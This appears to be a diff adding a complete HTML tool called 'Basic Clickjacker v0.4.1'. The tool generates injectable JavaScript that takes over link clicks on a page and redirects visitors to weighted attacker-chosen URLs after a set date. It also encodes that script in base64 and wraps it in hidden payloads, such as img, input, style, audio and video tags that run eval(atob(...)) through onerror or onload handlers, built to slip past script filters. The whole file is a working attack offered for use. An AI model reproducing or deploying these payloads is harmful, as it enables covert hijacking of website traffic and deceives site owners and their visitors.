@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Basic Clickjacker v0.4.1</title>
+    <style type='text/css'>
+    .main_container {
+        display: grid;
+        grid-template-columns: 1fr;
+        grid-template-rows: auto auto 1fr;
+        grid-template-areas: 
+            "header"
+            "form_content"
+            "form_result";
+    }
+    .header {
+        grid-area: header;
+    }
+    .form_label {
+        grid-area: form_content;
+    }
+    .form_result {
+        grid-area: form_result;
+    }
+    .form_content_container {
+        margin-top: 5px;
+        display: grid;
+        grid-template-columns: 2fr 3fr 1fr 3fr;
+        grid-template-rows: 1fr;
+        grid-template-areas: "form_label location_input weight_input form_text";
+    }
+    .form_content_container .form_label {
+        grid-area: form_label;
+        align-self: center;
+    }
+    .form_content_container .location_input {
+        grid-area: location_input;
+        align-self: center;
+    }
+    .form_content_container .weight_input {
+        grid-area: weight_input;
+        align-self: center;
+    }
+    .form_content_container .form_text {
+        grid-area: form_text;
+        align-self: center;
+    }
+    .form_content_container .weight_input input {
+        width: 40px !important;
+    }
+    .simple_form_row {
+        display: grid;
+        grid-template-columns: 1fr 1fr 2fr;
+        grid-template-rows: 1fr;
+        grid-template-areas: "form_label container_input form_text";
+    }
+    .simple_form_row .form_label {
+        grid-area: form_label;
+        align-self: center;
+    }
+    .simple_form_row .container_input {
+        grid-area: container_input;
+        align-self: center;
+    }
+    .simple_form_row .form_text {
+        grid-area: form_text;
+        align-self: center;
+    }
+    label {
+        font-weight: bold;
+    }
+    input {
+        width: 90%;
+        padding: 6px 12px;
+        font-size: 14px;
+        line-height: 1.42857143;
+        color: #555;
+        background-color: #fff;
+        background-image: none;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-shadow:inset 0 1px 1px rgba(0,0,0,.075);
+    }
+    input:focus{
+        border-color: #66afe9;
+        outline: 0;
+        -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075),
+            0 0 8px rgba(102,175,233,.6);
+        box-shadow: inset 0 1px 1px rgba(0,0,0,.075),
+            0 0 8px rgba(102,175,233,.6);
+    }
+    #form_generate {
+        background-image: linear-gradient(to bottom,#337ab7 0,#265a88 100%);
+        background-repeat: repeat-x;
+        border-color: #245580;
+        text-shadow: 0 -1px 0 rgba(0,0,0,.2);
+        box-shadow: inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);
+        color: #fff;
+        background-color: #337ab7;
+        border: 1px solid transparent;
+        border-radius: 4px;
+        display: inline-block;
+        padding: 6px 12px;
+        margin-bottom: 0;
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 1.42857143;
+        text-align: center;
+        white-space: nowrap;
+        vertical-align: middle;
+    }
+    </style>
+</head>
+<body>
+<div class='main_container'>
+    <div class='header'>
+        <h1>Basic Clickjacker v0.4.1</h1>
+    </div>
+    <form action="" name="main_form" id="main_form">
+    <div class='form_content'>
+        <div class="simple_form_row">
+            <div class="form_label"><label for="locations0">Original URL </label></div>
+            <div class="container_input"><input type="text" name="original_url" id="original_url"></div>
+            <div class="form_text">
+                <p>Original url. It doesn't have to be the full URL, but make it start from http:// to at least finish the full domain name. 
+                For example: http://example.com or http://example.com/more/specific/path</p>
+            </div>
+        </div>
+        <div class="simple_form_row">
+            <div class="form_label"><label for="locations0">No redirect weight</label></div>
+            <div class="container_input"><input type="number" name="no_redirect_weight" id="no_redirect_weight" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+                <p>This is the weight of visits that the clickjacker will not redirect on purpose. 0 means always redirect.
+                Larger than 0 will make it so that a percentage of visits stays on the site.</p>
+            </div>
+        </div>
+        <div class="simple_form_row">
+            <div class="form_label"><label for="locations0">Date</label></div>
+            <div class="container_input"><input placeholder="2017/10/30" type="text" name="date" id="date"></div>
+            <div class="form_text">
+                <p>Date in which the redirections start to happen. Must be in the format YYYY/MM/DD for this to work.</p>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations0">Website Entry 1</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations0"></div>
+            <div class="weight_input"><label for="weights0">Weight: </label><input type="number" name="weights" id="weights0" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations1">Website Entry 2</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations1"></div>
+            <div class="weight_input"><label for="weights1">Weight: </label><input type="number" name="weights" id="weights1" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations2">Website Entry 3</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations2"></div>
+            <div class="weight_input"><label for="weights2">Weight: </label><input type="number" name="weights" id="weights2" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations3">Website Entry 4</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations3"></div>
+            <div class="weight_input"><label for="weights3">Weight: </label><input type="number" name="weights" id="weights3" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations4">Website Entry 5</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations4"></div>
+            <div class="weight_input"><label for="weights4">Weight: </label><input type="number" name="weights" id="weights4" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations5">Website Entry 6</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations5"></div>
+            <div class="weight_input"><label for="weights5">Weight: </label><input type="number" name="weights" id="weights5" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations6">Website Entry 7</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations6"></div>
+            <div class="weight_input"><label for="weights6">Weight: </label><input type="number" name="weights" id="weights6" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations7">Website Entry 8</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations7"></div>
+            <div class="weight_input"><label for="weights7">Weight: </label><input type="number" name="weights" id="weights7" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div class="form_content_container">
+            <div class="form_label"><label for="locations8">Website Entry 9</label></div>
+            <div class="location_input"><input placeholder="http://someurl.com/path/to/page" type="text" name="locations" id="locations8"></div>
+            <div class="weight_input"><label for="weights8">Weight: </label><input type="number" name="weights" id="weights8" data-type='weight'></div>
+            <div class="form_text">
+                <span class='weight_percentage'></span>
+            </div>
+        </div>
+        <div>
+            <button id="form_generate">
+                Generate code.
+            </button>
+        </div>
+        </form>
+    </div>
+    <div id="form_result" style='display:none;'>
+		<p><label for="js_code">Using Js Code</label>
+            <textarea name="" id="js_code" cols="120" rows="4"></textarea></p>
+        <p><label for="img_code">Using img tag</label>
+            <textarea name="" id="img_code" cols="120" rows="4"></textarea></p>
+			
+        <!-- <p><label for="body_code">Using body tag</label>
+            <textarea name="" id="body_code" cols="120" rows="4"></textarea><br />
+            This cannot be added anywhere. You have you replace the body tag with this code.</p>
+        <p><label for="link_code">Using link tag</label>
+            <textarea name="" id="link_code" cols="120" rows="4"></textarea></p> -->
+        <p><label for="input_code">Using input tag</label>
+            <textarea name="" id="input_code" cols="120" rows="4"></textarea></p>
+        <p><label for="style_code">Using style tag</label>
+            <textarea name="" id="style_code" cols="120" rows="4"></textarea></p>
+        <p><label for="audio_code">Using audio tag</label>
+            <textarea name="" id="audio_code" cols="120" rows="4"></textarea></p>
+        <p><label for="video_code">Using video tag</label>
+            <textarea name="" id="video_code" cols="120" ro	ws="4"></textarea></p>
+    </div>
+</div>
+<!-- Pre-templates. They serve to create the javascript code that does the click jacking action 
+ Require :original_url => for example "http://example.com/testing/123"
+         :locations => array with locations. "n" serves as "no redirect". Example: ["n","http://destination1.com/1","http://destination2.net/2"]
+         :percentages => arrays with accumulated weights. First being 0.5 means 
+            it will happen 50% of cases, second being 0.65 means it will happen 65% minus 50% of cases (so 15%). Last one always has to be 1.0.
+            For example: [0.7,0.85,1.0]
+         :date => select when you want to start redirecting. Needs a Date string in the format "yyyy/mm/dd"
+
+-->
+<script type='text/template' id="func_pre_template">
+var btns = document.getElementsByTagName('a');
+var imgs = document.getElementsByTagName('img');
+for (var i = 0; i < btns.length; i++) {
+    for (let j = 0; j < imgs.length; j++) {
+        var img = imgs[j];
+        img.style.setProperty('display', 'inline-block', 'important');
+    }
+    var btn = null; btn = btns[i];
+    btn.style.setProperty('display', 'inline-block', 'important');
+    btn.addEventListener("click", function (event) {
+        debugger; event.preventDefault();
+        var href = event.target.href;
+        if (!href) {
+            var anchor = event.target.closest("a");
+            href = anchor.getAttribute('href');
+        }
+        var host = window.location.href;
+	:redirectionLogic
+    });
+
+}
+</script>
+<script type='text/template' id="pre_template">
+    o = :original_url;
+    l = :locations;
+    p = :percentages;
+    d = new Date(:date);
+    if (host.indexOf(o) === -1) {
+        if (Date.now() >= d) {
+            r = Math.random();
+            if (window.location.href.indexOf(o) !== 0) {
+                for (i in l) {
+                    if (p[i] >= r) {
+                        if (l[i] != 'n') {
+							top.location = l[i];
+                            break;
+                        } else {
+							top.location = href;
+                            break;
+                        }
+                    }
+                }
+            }
+        } else {
+			top.location = href;
+        }
+    } else {
+		top.location = href;
+    }
+
+</script>
+
+<!-- "Final" templates. Only require replacing :src which is the base64 encoded javascript -->
+<script type='text/template' id="final_js">eval(atob(':src'));</script>
+<!-- "Final" templates. Only require replacing :src which is the base64 encoded javascript -->
+<script type='text/template' id="final_img"><img data-src=':src' onerror='eval(atob(this.dataset.src))' src style="display:none" /></script>
+
+<!--<script type='text/template' id="final_body"><body data-src=':src' onload='eval(atob(this.dataset.src))' /></script>
+<script type='text/template' id="final_link"><link data-src=':src' onerror='eval(atob(this.dataset.src))' src /></script>-->
+<script type='text/template' id="final_input"><input type='image' data-src=':src' onerror='eval(atob(this.dataset.src))' src style="display:none" /></script>
+<script type='text/template' id='final_style'><style data-src=':src' onload='eval(atob(this.dataset.src))'></style></script>
+<script type='text/template' id='final_audio'><audio data-src=':src' onerror='eval(atob(this.dataset.src))' src style="display:none"></audio></script>
+<script type='text/template' id='final_video'><video data-src=':src' onerror='eval(atob(this.dataset.src))' src style='display:none'></video></script>
+<script>
+"use strict";
+let weight_inputs = document.querySelectorAll('input[data-type=weight]');
+for (let wi of weight_inputs) {
+    wi.addEventListener('change', e => {
+        let curr_weight_inputs = document.querySelectorAll('input[data-type=weight]');
+        let all_weights = Array.from(curr_weight_inputs);
+        let sum_weights = all_weights.filter(e => e.value !== '').map(e => parseInt(e.value)).reduce((accum, n) => accum + n);
+        for (let curr_input of curr_weight_inputs) {
+            if (curr_input.value === '') continue;
+            let percentage_elem = curr_input.parentElement.parentElement.querySelector('.weight_percentage');
+            let percentage = (parseInt(curr_input.value) / sum_weights * 100).toFixed(2);
+            percentage_elem.innerHTML = percentage + '%';
+        }
+    });
+}
+
+let form_generate = document.getElementById('form_generate');
+form_generate.addEventListener('click', (e) => {
+	debugger;
+    let locations = [];
+    document.main_form.elements.locations.forEach((elem) => { locations.push(elem.value); });
+    let weights = [];
+    document.main_form.elements.weights.forEach((elem) => { weights.push(parseInt(elem.value)); });
+    let sum_weights = 0;
+    let original_url = document.main_form.elements.original_url.value;
+    let no_redirect_weight = parseInt(document.main_form.elements.no_redirect_weight.value);
+    let date = document.main_form.elements.date.value;
+    let filtered_locations = [];
+    let filtered_weights = [];
+	let js_code = document.getElementById('js_code');
+    let img_code = document.getElementById('img_code');
+    // let body_code = document.getElementById('body_code');
+    // let link_code = document.getElementById('link_code');
+    let style_code = document.getElementById('style_code');
+    let input_code = document.getElementById('input_code');
+    let audio_code = document.getElementById('audio_code');
+    let video_code = document.getElementById('video_code');
+    // We must ensure that no location is without weight and also viceversa.
+    for (let i in locations) {
+        if (locations[i] !== "" && Number.isSafeInteger(weights[i])) {
+            filtered_weights.push(weights[i]);
+            filtered_locations.push(locations[i]);
+        }
+    }
+    // We should add the no redirect also.
+    filtered_locations.unshift('n');
+    filtered_weights.unshift(no_redirect_weight);
+    // Now lets get all relevant weights and then proceed to get percentages
+    filtered_weights.forEach((w) => {
+        sum_weights += w;
+    });
+    let percentages = [];
+    // lets remember the rules from the pre_template we will use. Last value in the array must be 1.0 and percentages must be accumulative.
+    let percentage_accum = 0.0;
+    filtered_weights.forEach((w) => {
+        percentage_accum += w / sum_weights;
+        percentage_accum = parseFloat(percentage_accum.toFixed(2));
+        percentages.push(percentage_accum);
+    });
+    // Math isn't perfect! sum might not be 1.0 but 0.99999 or similar, so we just replace it with 1.0 :)
+    percentages[percentages.length - 1] = 1.0;
+    //Lets validate input a little bit...
+    let date_regex = /^\d{4}\/\d{2}\/\d{2}$/;
+    let alert_message = "";
+    if (filtered_weights.length == 1) {
+        alert_message += "All given URLs must have a weight. Weight must be a number (any zero or positive integer). There must be at least a pair of URL and weight. ";
+    }
+    if (!date_regex.test(date)) {
+        alert_message += "Date is not in the correct format! Ensure it is YYYY/MM/DD. ";
+    }
+    if (original_url === '') {
+        alert_message += "Original URL is missing. ";
+    }
+    if (alert_message !== "") {
+        window.alert(alert_message);
+        e.preventDefault();
+        return false;
+    }
+    let json_locations = JSON.stringify(filtered_locations);
+    let json_percentages = JSON.stringify(percentages);
+    let json_date = JSON.stringify(date);
+    let json_original_url = JSON.stringify(original_url);
+    let template = document.getElementById('pre_template').innerHTML;
+	let funcTemplate = document.getElementById('func_pre_template').innerHTML;
+	
+    template = template.replace(':locations', json_locations);
+    template = template.replace(':percentages', json_percentages);
+    template = template.replace(':date', json_date);
+    template = template.replace(':original_url', json_original_url);
+    funcTemplate = funcTemplate.replace(':redirectionLogic', template);
+    
+	let encoded_js = btoa(funcTemplate);
+	
+	 let final_js = document.getElementById('final_js').innerHTML;
+    final_js = final_js.replace(':src', encoded_js);
+   
+   let final_img = document.getElementById('final_img').innerHTML;
+    final_img = final_img.replace(':src', encoded_js);
+    // let final_body = document.getElementById('final_body').innerHTML;
+    // final_body = final_body.replace(':src', encoded_js);
+    // let final_link = document.getElementById('final_link').innerHTML;
+    // final_link = final_link.replace(':src', encoded_js);
+    let final_input = document.getElementById('final_input').innerHTML;
+    final_input = final_input.replace(':src', encoded_js);
+    let final_style = document.getElementById('final_style').innerHTML;
+    final_style = final_style.replace(':src', encoded_js);
+    let final_audio = document.getElementById('final_audio').innerHTML;
+    final_audio = final_audio.replace(':src', encoded_js);
+    let final_video = document.getElementById('final_video').innerHTML;
+    final_video = final_video.replace(':src', encoded_js);
+	
+	js_code.value = final_js;
+    img_code.value = final_img;
+    // body_code.value = final_body;
+    // link_code.value = final_link;
+    input_code.value = final_input;
+    style_code.value = final_style;
+    audio_code.value = final_audio;
+    video_code.value = final_video;
+    document.getElementById('form_result').style.display = 'block';
+    e.preventDefault();
+});
+</script>
+</body>
+</html>
